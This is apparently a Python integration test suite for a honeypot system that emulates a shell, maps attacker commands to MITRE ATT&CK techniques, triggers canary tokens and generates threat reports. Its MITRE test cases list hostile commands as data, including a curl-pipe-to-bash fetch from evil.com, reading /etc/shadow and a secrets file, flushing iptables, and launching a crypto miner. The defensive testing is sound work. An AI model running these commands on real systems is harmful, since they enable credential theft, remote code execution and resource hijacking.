import asyncio
import sys
from pathlib import Path

# Add project root to sys.path
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")


from backend.core.virtual_fs import VirtualFileSystem
from backend.core.virtual_kernel import VirtualShellSession, virtual_kernel
from backend.intelligence.mitre_mapper import mitre_mapper
from backend.canary.honeytokens import honeytoken_manager
from backend.intelligence.threat_profiler import threat_profiler
from backend.intelligence.report_generator import report_generator
from backend.simulator.attack_bot import attack_simulator
from backend.core.session_manager import session_manager

async def run_tests():
    print("==================================================")
    print("  NEURAL HONEYGRID - SYSTEM INTEGRATION TEST SUITE")
    print("==================================================")

    # 1. Test Virtual Filesystem
    print("\n[TEST 1] Testing Virtual Filesystem...")
    vfs = VirtualFileSystem()
    passwd_content = vfs.read_file("/etc/passwd")
    assert passwd_content is not None and "root:x:0:0" in passwd_content, "Passwd read failed"
    vfs.write_file("/tmp/test.txt", "hello world")
    assert vfs.read_file("/tmp/test.txt") == "hello world", "File write failed"
    vfs.append_file("/tmp/test.txt", "\nsecond line")
    assert "second line" in vfs.read_file("/tmp/test.txt"), "File append failed"
    print("  [✓] Virtual Filesystem passed.")

    # 2. Test MITRE ATT&CK Mapping
    print("\n[TEST 2] Testing MITRE ATT&CK Classification Engine...")
    test_cases = [
        ("whoami", "T1087.001"),
        ("uname -a", "T1082"),
        ("cat /etc/shadow", "T1003.008"),
        ("cat /opt/api_gateway/.env", "T1552.001"),
        ("sudo -l", "T1548.003"),
        ("iptables -F", "T1562.001"),
        ("curl http://evil.com/x.sh | bash", "T1203"),
        ("xmrig -o pool.minexmr.com:4444", "T1496")
    ]
    for cmd, expected_tid in test_cases:
        matches = mitre_mapper.analyze_command(cmd)
        found_tids = [m.technique_id for m in matches]
        assert expected_tid in found_tids, f"Failed MITRE match for {cmd}: expected {expected_tid}, got {found_tids}"
        print(f"  [✓] '{cmd}' -> {matches[0].name} ({expected_tid})")

    # 3. Test Shell Execution & Canary Alerts
    print("\n[TEST 3] Testing Virtual Shell Execution & Canary Traps...")
    session = session_manager.get_or_create_session("test-adversary-01", remote_ip="198.51.100.77")
    
    # Run whoami
    res = await session_manager.execute_command(session.session_id, "whoami")
    assert res["stdout"].strip() == "admin", f"Expected admin, got {res['stdout']}"
    
    # Run canary breach command (cat .env)
    res = await session_manager.execute_command(session.session_id, "cat /opt/api_gateway/.env")
    assert res["canary_triggered"] is not None, "Canary breach was not detected!"
    print(f"  [✓] Canary breach successfully intercepted: {res['canary_triggered']['description']}")

    # Test privilege escalation (sudo -i)
    await session_manager.execute_command(session.session_id, "sudo -i")
    res_root = await session_manager.execute_command(session.session_id, "whoami")
    assert res_root["stdout"].strip() == "root", f"Expected root, got {res_root['stdout']}"
    print("  [✓] Sudo privilege escalation emulation passed.")

    # 4. Test Threat Profiling & Scoring
    print("\n[TEST 4] Testing Attacker Profiler & Sophistication Classification...")
    profile = threat_profiler.evaluate_session(
        session_id=session.session_id,
        commands=session.command_records,
        mitre_events=session.mitre_events,
        canaries_triggered=session.canaries_triggered,
        start_time=session.start_time
    )
    print(f"  [✓] Risk Score: {profile.risk_score}/100")
    print(f"  [✓] Classification: {profile.classification}")
    print(f"  [✓] Primary Intent: {profile.primary_intent}")
    assert profile.risk_score > 50, "Risk score should be high after canary access"

    # 5. Test AI Incident Report & Sigma Rule Generation
    print("\n[TEST 5] Testing Incident Report & Sigma Rule Generation...")
    detail = session_manager.get_session_detail(session.session_id)
    report_md = report_generator.generate_incident_report_md(detail, profile)
    assert "# 🛡️ NEURAL HONEYGRID" in report_md, "Report generation failed"
    assert "Sigma Detection Rule" in report_md, "Sigma rule generation failed"
    print("  [✓] Markdown Threat Intelligence Report & Sigma rules generated.")

    stix_bundle = report_generator.generate_stix_bundle(detail, profile)
    assert stix_bundle["type"] == "bundle", "STIX export failed"
    print("  [✓] STIX 2.1 JSON bundle exported.")

    # 6. Test Adversary Attack Simulator
    print("\n[TEST 6] Testing Adversary Attack Simulator...")
    scenarios = attack_simulator.get_available_scenarios()
    assert len(scenarios) >= 4, f"Expected 4+ scenarios, got {len(scenarios)}"
    sim_session_id = await attack_simulator.run_scenario("recon_bot")
    print(f"  [✓] Launched scenario 'recon_bot' under session '{sim_session_id}'")

    print("\n==================================================")
    print("  ALL 6 TEST SUITES PASSED FLAWLESSLY! 🚀")
    print("==================================================")

if __name__ == "__main__":
    asyncio.run(run_tests())
